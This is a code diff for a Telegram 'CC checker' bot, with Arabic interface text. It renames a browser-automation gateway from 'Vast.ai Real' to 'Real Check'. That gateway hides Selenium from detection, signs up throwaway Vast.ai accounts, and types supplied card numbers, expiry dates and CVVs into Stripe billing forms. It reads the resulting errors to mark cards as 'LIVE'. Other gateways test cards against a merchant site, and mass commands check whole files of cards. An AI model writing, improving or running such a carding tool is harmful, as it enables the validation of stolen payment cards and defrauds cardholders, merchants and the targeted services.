@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Real Multi Gateway CC Checker Bot
-Version: 15.0 - Final with Vast.ai Real Gateway
+Version: 15.0 - Final with Real Gateway
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -58,7 +58,6 @@ try:
     from selenium.common.exceptions import TimeoutException, NoSuchElementException
 except ImportError as e:
     print(f"⚠️ Selenium غير مثبتة: {e}")
-    print("📦 للتثبيت: pip install selenium")
 
 # تجاهل التحذيرات
 warnings.filterwarnings("ignore")
@@ -97,7 +96,7 @@ GROUPS_FILE = os.path.join(DATA_FOLDER, "groups.json")
 # ==================== إعدادات البوابات ====================
 GATES = {
     "stripe1": {
-        "name": "💳 Stripe Auth v1",
+        "name": "💳 Stripe v1",
         "description": "فحص بطاقات عبر بوابة Stripe الأولى",
         "command": "st1",
         "mass_command": "st1m",
@@ -107,7 +106,7 @@ GATES = {
         "default": True
     },
     "stripe2": {
-        "name": "💎 Stripe Auth v2",
+        "name": "💎 Stripe v2",
         "description": "فحص بطاقات عبر بوابة Stripe الثانية",
         "command": "st2",
         "mass_command": "st2m",
@@ -116,14 +115,14 @@ GATES = {
         "icon": "💎",
         "default": False
     },
-    "vastai": {
-        "name": "🚀 Vast.ai Real",
-        "description": "فحص بطاقات حقيقي عبر Vast.ai",
-        "command": "vast",
-        "mass_command": "vastm",
+    "real": {
+        "name": "🔥 Real Check",
+        "description": "فحص بطاقات حقيقي عبر نظام متقدم",
+        "command": "chk",
+        "mass_command": "chkm",
         "enabled": True,
-        "timeout": 60,
-        "icon": "🚀",
+        "timeout": 90,
+        "icon": "🔥",
         "default": False
     }
 }
@@ -145,60 +144,54 @@ ua = UserAgent()
 
 # متغيرات عامة
 user_last_file = {}
-user_browsers = {}  # تخزين متصفحات المستخدمين
-user_check_status = {}  # حالة فحص كل مستخدم
+user_browsers = {}
 
-# ==================== بوابة Vast.ai الحقيقية ====================
-class VastAIGateway:
-    """Vast.ai Real Card Verification with Browser Automation"""
+# ==================== بوابة الفحص الحقيقي ====================
+class RealGateway:
+    """Real Card Verification with Browser Automation"""
     
     def __init__(self):
         self.user_browsers = {}
         self.user_wait = {}
-        self.user_accounts = {}
-        self.user_current_card = {}
         
     def setup_driver_for_user(self, user_id: int) -> bool:
         """Setup Chrome driver for specific user"""
         try:
             chrome_options = Options()
             
-            # Options for headless mode
+            # إعدادات Chrome للعمل في Docker
             chrome_options.add_argument('--headless=new')
             chrome_options.add_argument('--no-sandbox')
             chrome_options.add_argument('--disable-dev-shm-usage')
             chrome_options.add_argument('--disable-gpu')
-            chrome_options.add_argument('--window-size=412,915')
+            chrome_options.add_argument('--window-size=1920,1080')
             chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+            chrome_options.add_argument('--disable-extensions')
+            chrome_options.add_argument('--disable-setuid-sandbox')
+            
+            # إخفاء أن selenium يتحكم بالمتصفح
             chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
             chrome_options.add_experimental_option('useAutomationExtension', False)
             
-            # Mobile emulation
-            mobile_emulation = {
-                "deviceMetrics": {"width": 412, "height": 915, "pixelRatio": 3.0},
-                "userAgent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"
+            # وكيل المستخدم
+            chrome_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
+            
+            # إعدادات إضافية
+            prefs = {
+                "credentials_enable_service": False,
+                "profile.password_manager_enabled": False,
+                "profile.default_content_setting_values.notifications": 2
             }
-            chrome_options.add_experimental_option("mobileEmulation", mobile_emulation)
+            chrome_options.add_experimental_option("prefs", prefs)
             
-            # Find chromedriver
-            chromedriver_paths = [
-                "/usr/bin/chromedriver",
-                "/usr/local/bin/chromedriver",
-                "chromedriver"
-            ]
+            # مسار Chromium
+            chrome_options.binary_location = "/usr/bin/chromium"
             
-            chromedriver_path = None
-            for path in chromedriver_paths:
-                if os.path.exists(path):
-                    chromedriver_path = path
-                    break
-            
-            if not chromedriver_path:
-                return False
-            
-            service = Service(executable_path=chromedriver_path)
+            # إنشاء driver
+            service = Service(executable_path="/usr/bin/chromedriver")
             driver = webdriver.Chrome(service=service, options=chrome_options)
             driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+            driver.set_page_load_timeout(60)
             
             self.user_browsers[user_id] = driver
             self.user_wait[user_id] = WebDriverWait(driver, 30)
@@ -221,7 +214,7 @@ class VastAIGateway:
     
     def generate_email(self) -> str:
         """Generate random email"""
-        names = ["john", "mike", "david", "sarah", "emma", "alex", "chris", "jordan", "obeida", "ahmed"]
+        names = ["john", "mike", "david", "sarah", "emma", "alex", "chris", "jordan"]
         numbers = random.randint(100, 9999)
         return f"{random.choice(names)}.{numbers}@gmail.com"
     
@@ -243,7 +236,7 @@ class VastAIGateway:
             time.sleep(0.5)
     
     def create_account_real(self, user_id: int, email: str) -> bool:
-        """Real signup on Vast.ai"""
+        """Real signup"""
         driver = self.user_browsers.get(user_id)
         wait = self.user_wait.get(user_id)
         
@@ -251,46 +244,57 @@ class VastAIGateway:
             return False
         
         try:
-            # Open Vast.ai
             driver.get("https://cloud.vast.ai/create/")
-            time.sleep(4)
+            time.sleep(5)
             
-            # Close any alerts
-            try:
-                close_btn = driver.find_element(By.CSS_SELECTOR, "div.MuiAlert-action path")
-                close_btn.click()
-                time.sleep(1)
-            except:
-                pass
-            
-            # Click Login button
-            login_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Login')]")))
-            self.human_click(driver, login_btn)
+            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
             time.sleep(2)
             
-            # Fill email
+            # البحث عن زر Login
+            login_selectors = [
+                "//span[contains(text(), 'Login')]",
+                "//button[contains(text(), 'Login')]",
+                "//a[contains(text(), 'Login')]"
+            ]
+            
+            login_btn = None
+            for selector in login_selectors:
+                try:
+                    login_btn = wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
+                    if login_btn:
+                        break
+                except:
+                    continue
+            
+            if login_btn:
+                self.human_click(driver, login_btn)
+                time.sleep(3)
+            else:
+                return False
+            
+            # إدخال البريد الإلكتروني
             email_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email']")))
             email_field.clear()
             self.human_type(driver, email_field, email)
-            time.sleep(1)
+            time.sleep(2)
             
-            # Fill password
+            # إدخال كلمة المرور
             password = "Obeida059@"
             password_fields = driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
             if password_fields:
                 password_fields[0].clear()
                 self.human_type(driver, password_fields[0], password)
-                time.sleep(1)
+                time.sleep(2)
             
             if len(password_fields) > 1:
                 password_fields[1].clear()
                 self.human_type(driver, password_fields[1], password)
-                time.sleep(1)
+                time.sleep(2)
             
-            # Click Sign Up
+            # الضغط على زر التسجيل
             signup_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "[data-testid='auth-submit-login-signup']")))
             self.human_click(driver, signup_btn)
-            time.sleep(4)
+            time.sleep(5)
             
             return True
             
@@ -299,7 +303,7 @@ class VastAIGateway:
             return False
     
     def add_card_real(self, user_id: int, card_data: Dict) -> Tuple[bool, str]:
-        """Add card to Stripe on Vast.ai"""
+        """Add card"""
         driver = self.user_browsers.get(user_id)
         wait = self.user_wait.get(user_id)
         
@@ -307,102 +311,86 @@ class VastAIGateway:
             return False, "Browser not initialized"
         
         try:
-            # Go to billing
-            try:
-                menu_btn = driver.find_element(By.CSS_SELECTOR, "header rect, header svg")
-                self.human_click(driver, menu_btn)
-                time.sleep(2)
-            except:
-                pass
+            driver.get("https://cloud.vast.ai/billing/")
+            time.sleep(5)
             
-            # Click Billing
-            billing_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Billing')]")))
-            self.human_click(driver, billing_btn)
+            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
             time.sleep(3)
             
-            # Click Add Card
+            # البحث عن زر Add Card
             add_card_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Add Card')]")))
             self.human_click(driver, add_card_btn)
             time.sleep(5)
             
-            # Switch to Stripe iframe
-            try:
-                iframes = driver.find_elements(By.TAG_NAME, "iframe")
-                for iframe in iframes:
-                    try:
-                        driver.switch_to.frame(iframe)
-                        if driver.find_elements(By.ID, "cardNumber"):
-                            break
-                        driver.switch_to.default_content()
-                    except:
-                        driver.switch_to.default_content()
-                        continue
-                time.sleep(2)
-            except:
-                pass
+            # البحث عن iframe الخاص بـ Stripe
+            iframes = driver.find_elements(By.TAG_NAME, "iframe")
+            for iframe in iframes:
+                try:
+                    driver.switch_to.frame(iframe)
+                    if driver.find_elements(By.ID, "cardNumber"):
+                        break
+                    driver.switch_to.default_content()
+                except:
+                    driver.switch_to.default_content()
+                    continue
             
-            # Fill card details
-            # Card number
+            time.sleep(2)
+            
+            # إدخال بيانات البطاقة
             card_input = wait.until(EC.presence_of_element_located((By.ID, "cardNumber")))
             card_input.click()
             card_input.clear()
             self.human_type(driver, card_input, card_data['number'])
-            time.sleep(1.5)
+            time.sleep(2)
             
-            # Expiry
             expiry_input = driver.find_element(By.ID, "cardExpiry")
             expiry_input.click()
             expiry_input.clear()
             self.human_type(driver, expiry_input, f"{card_data['month']}{card_data['year']}")
-            time.sleep(1)
+            time.sleep(2)
             
-            # CVC
             cvc_input = driver.find_element(By.ID, "cardCvc")
             cvc_input.click()
             cvc_input.clear()
             self.human_type(driver, cvc_input, card_data['cvv'])
-            time.sleep(1)
+            time.sleep(2)
             
-            # Name
             name_input = driver.find_element(By.ID, "billingName")
             name_input.click()
             name_input.clear()
-            names = ["Michael Johnson", "Sarah Williams", "David Brown", "John Smith", "Emma Davis"]
+            names = ["Michael Johnson", "Sarah Williams", "David Brown", "John Smith"]
             self.human_type(driver, name_input, random.choice(names))
-            time.sleep(0.5)
+            time.sleep(1)
             
-            # Country
             country_input = driver.find_element(By.ID, "billingCountry")
             country_input.click()
             country_input.clear()
             self.human_type(driver, country_input, "US")
-            time.sleep(0.5)
+            time.sleep(1)
             
-            # Postal code
             postal_input = driver.find_element(By.ID, "billingPostalCode")
             postal_input.click()
             postal_input.clear()
             self.human_type(driver, postal_input, "10001")
-            time.sleep(1)
+            time.sleep(2)
             
-            # Submit
-            submit_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "div.SubmitButton-IconContainer, button[type='submit']")))
+            submit_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "div.SubmitButton-IconContainer")))
             self.human_click(driver, submit_btn)
-            time.sleep(6)
+            time.sleep(8)
             
-            # Check result
             driver.switch_to.default_content()
+            time.sleep(3)
             
-            # Look for error
+            # البحث عن رسائل الخطأ
             errors = driver.find_elements(By.CSS_SELECTOR, ".Error, .error, [role='alert']")
             for error in errors:
                 if error.is_displayed() and error.text:
                     error_text = error.text.lower()
-                    if "cvv" in error_text or "security code" in error_text:
+                    if "cvv" in error_text:
                         return True, "💳 CVV ERROR - Card is LIVE"
                     elif "insufficient" in error_text:
                         return True, "💰 INSUFFICIENT FUNDS - Card is LIVE"
-                    elif "stolen" in error_text or "lost" in error_text:
+                    elif "stolen" in error_text:
                         return True, "⚠️ RISK CARD - Card is LIVE"
                     return False, f"❌ {error.text[:50]}"
             
@@ -413,71 +401,29 @@ class VastAIGateway:
             return False, f"⚠️ Error: {str(e)[:50]}"
     
     async def process_card(self, user_id: int, card_data: Dict) -> Tuple[bool, str]:
-        """Process single card with real browser"""
+        """Process single card"""
         try:
-            # Setup browser if not exists
             if user_id not in self.user_browsers:
                 if not self.setup_driver_for_user(user_id):
                     return False, "❌ Browser initialization failed"
             
-            # Generate email
             email = self.generate_email()
             
-            # Create account
             if not self.create_account_real(user_id, email):
                 return False, "❌ Account creation failed"
             
-            # Add card
             success, message = self.add_card_real(user_id, card_data)
             
             return success, message
             
         except Exception as e:
             return False, f"⚠️ System Error: {str(e)[:50]}"
-    
-    async def process_multiple_cards(self, user_id: int, cards: List[Dict], progress_callback=None) -> List[Tuple[bool, str, Dict]]:
-        """Process multiple cards with same browser session"""
-        results = []
-        
-        try:
-            # Setup browser once
-            if user_id not in self.user_browsers:
-                if not self.setup_driver_for_user(user_id):
-                    for card in cards:
-                        results.append((False, "❌ Browser initialization failed", card))
-                    return results
-            
-            # Create one account for all cards
-            email = self.generate_email()
-            if not self.create_account_real(user_id, email):
-                for card in cards:
-                    results.append((False, "❌ Account creation failed", card))
-                return results
-            
-            # Test each card
-            for idx, card in enumerate(cards):
-                if progress_callback:
-                    await progress_callback(idx + 1, len(cards))
-                
-                success, message = await self.add_card_real(user_id, card)
-                results.append((success, message, card))
-                
-                # Wait between cards
-                if idx < len(cards) - 1:
-                    await asyncio.sleep(10)
-            
-        except Exception as e:
-            for card in cards:
-                results.append((False, f"⚠️ Error: {str(e)[:50]}", card))
-        
-        return results
 
 # ==================== إدارة البيانات ====================
 class DataManager:
     
     @staticmethod
     def init_files():
-        """تهيئة جميع الملفات تلقائياً"""
         if not os.path.exists(USERS_FILE):
             users = {}
             for admin_id in ADMIN_IDS:
@@ -511,7 +457,6 @@ class DataManager:
                 "auto_clean": True,
                 "clean_days": 30,
                 "maintenance_mode": False,
-                "maintenance_message": "البوت تحت الصيانة حالياً",
                 "default_check_gate": "stripe1",
                 "group_mode": True,
                 "require_sub_in_groups": True,
@@ -767,8 +712,7 @@ class DataManager:
         
         is_approved = any(x in result for x in [
             "✅", "LIVE", "Approved", "approved", "CHARGED",
-            "CVV ERROR", "INSUFFICIENT", "RISK CARD", "CVV2_FAILURE",
-            "INVALID_SECURITY_CODE", "AVS FAILED"
+            "CVV ERROR", "INSUFFICIENT", "RISK CARD"
         ])
         
         usage = users[uid].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
@@ -899,7 +843,6 @@ class Helpers:
     
     @staticmethod
     def extract_cards_from_text(text: str) -> List[Dict]:
-        """استخراج جميع البطاقات من النص"""
         cards = []
         lines = text.strip().split('\n')
         for line in lines:
@@ -1065,7 +1008,7 @@ class ResultFormatter:
 
 # ==================== بوابة Stripe 1 ====================
 class StripeGateway1:
-    """Stripe Gateway 1 - SetupIntent Auth مع User-Agent عشوائي"""
+    """Stripe Gateway 1 - SetupIntent Auth"""
     
     @staticmethod
     def normalize_url(url):
@@ -1263,7 +1206,7 @@ class StripeGateway1:
 
 # ==================== بوابة Stripe 2 ====================
 class StripeGateway2(StripeGateway1):
-    """Stripe Gateway 2 - نفس طريقة Stripe v1"""
+    """Stripe Gateway 2"""
     
     async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
         return await super().process_card("https://copenhagensilver.com", card_data)
@@ -1273,23 +1216,22 @@ class RealGateways:
     def __init__(self):
         self.gateway1 = StripeGateway1()
         self.gateway2 = StripeGateway2()
-        self.vastai = VastAIGateway()
+        self.real = RealGateway()
     
     async def check_card(self, gate: str, card: Dict, user_id: int = None, site_url: str = None) -> Tuple[bool, str]:
         if gate == 'stripe1':
             return await self.gateway1.process_card(site_url, card)
         elif gate == 'stripe2':
             return await self.gateway2.process_card(card)
-        elif gate == 'vastai':
+        elif gate == 'real':
             if user_id:
-                return await self.vastai.process_card(user_id, card)
-            return False, "❌ User ID required for Vast.ai gateway"
+                return await self.real.process_card(user_id, card)
+            return False, "❌ User ID required"
         else:
             return False, "❌ بوابة غير مدعومة"
     
     def cleanup_user(self, user_id: int):
-        """Clean up browser for user"""
-        self.vastai.cleanup_user(user_id)
+        self.real.cleanup_user(user_id)
 
 # ==================== مدير الفحص المتعدد ====================
 class MassCheckManager:
@@ -1358,7 +1300,7 @@ class UserInterface:
             btns = [
                 InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
                 InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
-                InlineKeyboardButton("🚀 Vast.ai Real", callback_data="gate_vastai"),
+                InlineKeyboardButton("🔥 Real Check", callback_data="gate_real"),
                 InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
                 InlineKeyboardButton("⚙️ البوابة الافتراضية", callback_data="default_gate"),
                 InlineKeyboardButton("⏱️ ضبط المدة", callback_data="set_delay"),
@@ -1372,7 +1314,7 @@ class UserInterface:
             btns = [
                 InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
                 InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
-                InlineKeyboardButton("🚀 Vast.ai Real", callback_data="gate_vastai"),
+                InlineKeyboardButton("🔥 Real Check", callback_data="gate_real"),
                 InlineKeyboardButton("📁 فحص آخر ملف", callback_data="check_last_file"),
                 InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
                 InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
@@ -1481,17 +1423,17 @@ class CommandHandler:
 <b>💡 يمكنك إرسال البطاقة مباشرة وسيتم فحصها تلقائياً!</b>
 
 <b>📝 البوابات المتاحة:</b>
-💳 Stripe v1 - فحص عبر SetupIntent
+💳 Stripe v1 - فحص عبر Stripe
 💎 Stripe v2 - فحص بديل
-🚀 Vast.ai Real - فحص حقيقي عبر Vast.ai
+🔥 Real Check - فحص حقيقي متقدم
 
 <b>📝 الأوامر:</b>
 /st1 - فحص بطاقة عبر Stripe v1
 /st2 - فحص بطاقة عبر Stripe v2
-/vast - فحص بطاقة عبر Vast.ai Real
+/chk - فحص بطاقة عبر النظام المتقدم
 /st1m - فحص ملف عبر Stripe v1
 /st2m - فحص ملف عبر Stripe v2
-/vastm - فحص ملف عبر Vast.ai Real
+/chkm - فحص ملف عبر النظام المتقدم
 /stop - إيقاف الفحص الحالي
 /delay - عرض أو تغيير المدة بين البطاقات
 
@@ -1508,7 +1450,7 @@ class CommandHandler:
 <b>📝 كيفية الاستخدام في المجموعة:</b>
 • أرسل البطاقة مع منشن البوت: <code>@{BOT_USERNAME} 4111111111111111|12|25|123</code>
 • أرسل ملف txt مع منشن البوت
-• استخدم /st1@ObeidaOnlineBot أو /st2@ObeidaOnlineBot أو /vast@ObeidaOnlineBot
+• استخدم /st1@ObeidaOnlineBot أو /st2@ObeidaOnlineBot أو /chk@ObeidaOnlineBot
 • /stop@ObeidaOnlineBot - إيقاف الفحص الحالي
 • /delay@ObeidaOnlineBot - عرض المدة الحالية
 
@@ -1529,7 +1471,7 @@ class CommandHandler:
             if check:
                 bot.reply_to(message, "⚠️ <b>لا يمكن إيقاف الفحص حالياً</b>\n\nيرجى المحاولة مرة أخرى.", parse_mode='HTML')
             else:
-                bot.reply_to(message, "ℹ️ <b>لا يوجد فحص نشط حالياً</b>\n\nاستخدم /st1m أو /st2m أو /vastm لبدء فحص جديد.", parse_mode='HTML')
+                bot.reply_to(message, "ℹ️ <b>لا يوجد فحص نشط حالياً</b>\n\nاستخدم /st1m أو /st2m أو /chkm لبدء فحص جديد.", parse_mode='HTML')
     
     def handle_delay(self, message):
         if not self.check_sub(message):
@@ -1656,7 +1598,7 @@ class CommandHandler:
             bot.answer_callback_query(call.id, "❌ فشل في تعيين البوابة")
     
     def check_single_card(self, message, card: Dict, gate: str):
-        """فحص بطاقة واحدة مع ثلاث دوائر متحركة"""
+        """فحص بطاقة واحدة"""
         user_id = message.from_user.id
         gate_name = GATES[gate]['name']
         masked_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
@@ -1784,7 +1726,6 @@ class CommandHandler:
         except Exception as e:
             print(f"Error in mass check: {e}")
         finally:
-            # Clean up browser after mass check
             self.gateways.cleanup_user(user_id)
     
     async def _process_mass_check(self, user_id: int):
@@ -2187,7 +2128,7 @@ class CallbackHandler:
             )
         
         elif data == "mass_check":
-            bot.edit_message_text("📁 أرسل ملف txt بالبطاقات\nسيتم فحص جميع البطاقات تلقائياً\n\n💡 بعد إرسال الملف، يمكنك استخدام /st1m أو /st2m أو /vastm لفحص آخر ملف",
+            bot.edit_message_text("📁 أرسل ملف txt بالبطاقات\nسيتم فحص جميع البطاقات تلقائياً\n\n💡 بعد إرسال الملف، يمكنك استخدام /st1m أو /st2m أو /chkm لفحص آخر ملف",
                                  call.message.chat.id, call.message.message_id,
                                  reply_markup=UserInterface.back_button())
         
@@ -2267,11 +2208,11 @@ def setup():
     @bot.message_handler(commands=['st2m'])
     def stripe2_mass(m): handler.handle_mass(m, 'stripe2')
     
-    @bot.message_handler(commands=['vast'])
-    def vast(m): handler.handle_single(m, 'vastai')
+    @bot.message_handler(commands=['chk'])
+    def real(m): handler.handle_single(m, 'real')
     
-    @bot.message_handler(commands=['vastm'])
-    def vast_mass(m): handler.handle_mass(m, 'vastai')
+    @bot.message_handler(commands=['chkm'])
+    def real_mass(m): handler.handle_mass(m, 'real')
     
     @bot.message_handler(content_types=['document'])
     def handle_document(m):
@@ -2315,10 +2256,10 @@ def setup():
     
     print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
     print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
-    print(Fore.YELLOW + "📌 البوابات المتاحة (مع User-Agent عشوائي):" + Style.RESET_ALL)
+    print(Fore.YELLOW + "📌 البوابات المتاحة:" + Style.RESET_ALL)
     print(Fore.WHITE + "   💳 Stripe v1: /st1 (فردي) | /st1m (ملف)" + Style.RESET_ALL)
     print(Fore.WHITE + "   💎 Stripe v2: /st2 (فردي) | /st2m (ملف)" + Style.RESET_ALL)
-    print(Fore.WHITE + "   🚀 Vast.ai Real: /vast (فردي) | /vastm (ملف)" + Style.RESET_ALL)
+    print(Fore.WHITE + "   🔥 Real Check: /chk (فردي) | /chkm (ملف)" + Style.RESET_ALL)
     print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
     print(Fore.YELLOW + "📌 الأوامر الإضافية:" + Style.RESET_ALL)
     print(Fore.WHITE + "   /stop - إيقاف الفحص الحالي" + Style.RESET_ALL)
